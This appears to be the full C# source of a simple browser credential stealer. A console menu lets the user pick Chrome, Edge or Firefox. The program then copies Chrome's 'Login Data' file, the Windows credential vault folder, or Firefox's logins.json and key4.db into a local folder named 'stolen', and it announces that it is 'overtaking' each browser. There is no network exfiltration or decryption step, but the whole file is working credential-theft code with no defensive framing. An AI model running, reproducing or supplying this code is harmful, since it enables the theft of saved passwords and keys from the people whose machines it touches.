using System;

DateTime thisDay = DateTime.Now;
int option = 1;
string user = Environment.UserName;
string apppath = AppDomain.CurrentDomain.BaseDirectory;

void Copy(string sourceDirectory, string targetDirectory)
{
    DirectoryInfo diSource = new DirectoryInfo(sourceDirectory);
    DirectoryInfo diTarget = new DirectoryInfo(targetDirectory);

    CopyAll(diSource, diTarget);
}

void CopyAll(DirectoryInfo source, DirectoryInfo target)
{
    Directory.CreateDirectory(target.FullName);

    foreach (FileInfo fi in source.GetFiles())
    {
        fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
    }

    foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
    {
        DirectoryInfo nextTargetSubDir =
            target.CreateSubdirectory(diSourceSubDir.Name);
        CopyAll(diSourceSubDir, nextTargetSubDir);
    }
}

while (true)
{
    Console.Clear();

    Console.WriteLine("1.) Chrome");
    Console.WriteLine("2.) Edge");
    Console.WriteLine("3.) Firefox");

    Console.Write("Type option: ");
    string d = Console.ReadLine();

    while (!Int32.TryParse(d, out option))
    {
        Environment.Exit(0);
    }

    option = Convert.ToInt32(d);

    switch (option)
    {
        case 1:
            Console.WriteLine("Overtaking Chrome browser...");

            string fileToCopychrome = (@"C:\Users\" + user + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
            string destinationDirectorychrome = (apppath + "/stolen/LoginData-Chrome-" + thisDay.Ticks + user);
            File.Copy(fileToCopychrome, destinationDirectorychrome);

            break;
        case 2:
            Console.WriteLine("Overtaking Edge browser...");

            string sourceDirectory = (@"C:\Users\" + user + @"\AppData\Local\Microsoft\vault");
            string targetDirectory = (apppath + "/stolen/Vault-Edge-" + thisDay.Ticks + user);

            Copy(sourceDirectory, targetDirectory);

            break;

        case 3:
            Console.WriteLine("Overtaking Firefox browser...");

            foreach (string fileLogin in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "logins.json", SearchOption.AllDirectories))
            {
                string fileToCopyfirefox = (fileLogin);
                string destinationDirectoryfirefox = (apppath + "/stolen/Loginjson-Firefox-" + thisDay.Ticks + user + ".json");
                File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
            }

            foreach (string fileKey in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "key4.db", SearchOption.AllDirectories))
            {
                string fileToCopyfirefox = (fileKey);
                string destinationDirectoryfirefox = (apppath + "/stolen/Key4db-Firefox-" + thisDay.Ticks + user + ".db");
                File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
            }

            break;

        default:
            Environment.Exit(0);
            break;
    }
}